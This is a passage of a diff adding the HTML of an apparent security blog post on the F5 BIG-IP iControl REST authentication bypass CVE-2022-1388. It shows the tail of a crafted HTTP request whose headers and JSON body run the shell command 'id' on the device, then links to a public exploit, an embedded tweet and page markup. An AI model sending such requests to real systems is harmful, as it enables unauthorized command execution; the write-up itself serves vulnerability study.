+</span></span><span style="display:flex;"><span>X-Forwarded-Proto: http
+</span></span><span style="display:flex;"><span>X-Forwarded-Host: localhost
+</span></span><span style="display:flex;"><span>X-F5-New-Authtok-Reqd: false
+</span></span><span style="display:flex;"><span>Local-Ip-From-Httpd: 192.168.52.10
+</span></span><span style="display:flex;"><span>X-Forwarded-Server: localhost.localdomain
+</span></span><span style="display:flex;"><span>Content-Length: <span style="color:#ae81ff">45</span>
+</span></span><span style="display:flex;"><span>Host: localhost:48470
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">{</span><span style="color:#e6db74">&#34;command&#34;</span>: <span style="color:#e6db74">&#34;run&#34;</span> , <span style="color:#e6db74">&#34;utilCmdArgs&#34;</span>: <span style="color:#e6db74">&#34; -c id&#34;</span> <span style="color:#f92672">}</span></span></span></code></pre></div></div>
+</div>
+
+<p>That&rsquo;s all from my side, you can look at python <a href="https://github.com/horizon3ai/CVE-2022-1388">exploit</a> from <a href="https://twitter.com/Horizon3Attack">Horizon3Attack team</a> or read their <a href="https://www.horizon3.ai/f5-icontrol-rest-endpoint-authentication-bypass-technical-deep-dive/">blog: F5 iControl REST vulnerability.</a></p>
+
+
+
+
+<h3 id="twitter-story" class="group block scroll-anchor py-4">
+    twitter story
+    <a id="f5-big-ip-icontrol-rest-vulnerability-cve-2022-1388-twitter-story" href="#f5-big-ip-icontrol-rest-vulnerability-cve-2022-1388-twitter-story" class="hidden group-hover:inline text-current ml-2">#</a>
+</h3><blockquote class="twitter-tweet"><p lang="en" dir="ltr">I looked at CVE-2022-1388 and I would say it has something in common with <a href="https://t.co/oDUa4ZmIS4">https://t.co/oDUa4ZmIS4</a> <a href="https://twitter.com/hashtag/F5?src=hash&amp;ref_src=twsrc%5Etfw">#F5</a> <a href="https://twitter.com/hashtag/BIG?src=hash&amp;ref_src=twsrc%5Etfw">#BIG</a>-IP <a href="https://twitter.com/hashtag/CVE?src=hash&amp;ref_src=twsrc%5Etfw">#CVE</a>-2022-1388 <a href="https://t.co/JjqLLkyjFm">https://t.co/JjqLLkyjFm</a></p>&mdash; matus bu(Rivest–Shamir–Adleman) (@BursaMatus) <a href="https://twitter.com/BursaMatus/status/1523379163914137600?ref_src=twsrc%5Etfw">May 8, 2022</a></blockquote>
+<script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>
+
+
+
+    </div><footer class="mt-6 pt-5 border-t not-prose">
+        <div class="flex flex-wrap gap-2"><span class="inline-block px-3 py-1 rounded-full text-sm" style="background-color: var(--color-bg-tertiary); color: var(--color-text-secondary);">
+              F5
+            </span><span class="inline-block px-3 py-1 rounded-full text-sm" style="background-color: var(--color-bg-tertiary); color: var(--color-text-secondary);">
+              CVE-2022-1388
+            </span><span class="inline-block px-3 py-1 rounded-full text-sm" style="background-color: var(--color-bg-tertiary); color: var(--color-text-secondary);">
+              BIG-IP
+            </span><span class="inline-block px-3 py-1 rounded-full text-sm" style="background-color: var(--color-bg-tertiary); color: var(--color-text-secondary);">
+              REST
+            </span><span class="inline-block px-3 py-1 rounded-full text-sm" style="background-color: var(--color-bg-tertiary); color: var(--color-text-secondary);">
+              API
+            </span></div>
+      </footer></article>
+
+  <div class="p-4">
+    
+  </div>
+</div>
+    </div><div class="hidden xl:block">
+<aside id="sidebar-right" class="sticky top-16 hidden xl:block h-[calc(100vh-4rem)] overflow-y-auto pr-2" data-component="navigation-sidebar-right" role="complementary" aria-label="On-page navigation">
+  
+  
+</aside>
+</div></main>
+  <footer>
+
+
+
+</footer>
+  
+  
+
+</body>
+</html>
